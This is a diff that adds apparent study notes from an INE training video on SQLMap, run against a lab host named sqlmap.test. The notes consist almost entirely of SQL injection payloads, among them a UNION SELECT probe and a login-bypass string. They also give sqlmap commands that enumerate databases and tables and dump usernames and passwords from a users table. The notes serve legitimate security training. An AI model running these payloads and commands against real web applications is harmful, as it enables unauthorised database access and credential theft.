@@ -1,0 +1,36 @@
+#SQLMap video notes
+#INE
+#Testing # of fields in URL:
+
+`sqlmap.test/search.php?search=notexists'UNION SELECT'els1','els2','els3','els4';-- -`
+
+#To discover the search parameter is vulnerable to SQLi
+
+#Using SQLMap to automate the exploit:
+
+`sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique=U`
+
+#Grab banner of the database
+`sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique=U --banner`
+#To see which payloads are used by SQLMap
+`sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique=U --banner -v3 --fresh-queries`
+#Copy and paste the payload found by SQLMap into the search URL. 
+`sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique=U -D blogdb -T users --columns`
+#Dump usernames and passwords from the previously discovered database.
+`sqlmap -u 'http://sqlmap.test/search.php?search=n' -p search --technique=U -D blogDB -T users -C username,password --dump`
+#Exploiting POST requests (login page) using Burp.
+#Change username to (in burp repeater)
+user=a' or 1=1; -- -&pass=a
+#Moving to SQLMap after verifying (user) is vulnerable to SQLi
+`sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B --banner
+#above is a boolean technique (B)
+#Enumerate databases
+`sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B --dbs
+#Using found database name
+`sqlmap -u http://sqlmap.test/login.php --data='user=a&pass=a' -p user --technique=B -D blogdb --tables
+#Back to burp --> right click on intercepted window --> copy to file --> name bloglogin.req
+#Back to SQLMap
+`sqlmap -r /root/bloglogin.req -p user --technique=B --banner
+
+
+
